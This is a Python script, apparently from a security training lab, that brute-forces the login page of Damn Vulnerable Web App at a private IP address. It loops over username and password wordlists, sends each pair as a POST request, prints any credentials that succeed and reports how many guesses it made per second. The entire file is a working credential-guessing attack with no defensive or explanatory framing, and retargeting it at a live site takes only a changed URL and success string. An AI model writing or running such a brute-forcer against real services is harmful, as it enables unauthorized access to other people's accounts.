import requests
import time

def login(username, password):
    # URL of the login page
    url = "http://192.168.170.129/login.php"

    # Form data for the login request
    data = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    # Send POST request to the login page
    response = requests.post(url, data=data)

    # Check if the response contains a success message
    if "Welcome to Damn Vulnerable Web App!" in response.text:
        return True  # Successful login
    return False  # Unsuccessful login

def main():
    # File paths for usernames and passwords lists
    usernames_file = "/home/sansforensics/Downloads/usernames.txt"
    passwords_file = "/home/sansforensics/Downloads/passwords.txt"

    # Read usernames and passwords from files
    usernames = open(usernames_file, "r").read().splitlines()
    passwords = open(passwords_file, "r").read().splitlines()

    # Measure the start time for performance evaluation
    start_time = time.time()
    total_passwords_tried = 0

    # Iterate through each username and password combination
    for username in usernames:
        for password in passwords:
            total_passwords_tried += 1

            # Attempt to login with the current username and password
            if login(username, password):
                print(f"Successful login! Username: {username}, Password: {password}")
                break  # Stop trying passwords for this username if successful

    # Measure the end time for performance evaluation
    end_time = time.time()
    elapsed_time = end_time - start_time
    passwords_per_second = total_passwords_tried / elapsed_time

    # Print summary statistics
    print(f"\nPassword cracking stopped after trying {total_passwords_tried} passwords.")
    print(f"Elapsed time: {elapsed_time} seconds")
    print(f"Passwords per second: {passwords_per_second:.2f}")

if __name__ == "__main__":
    main()
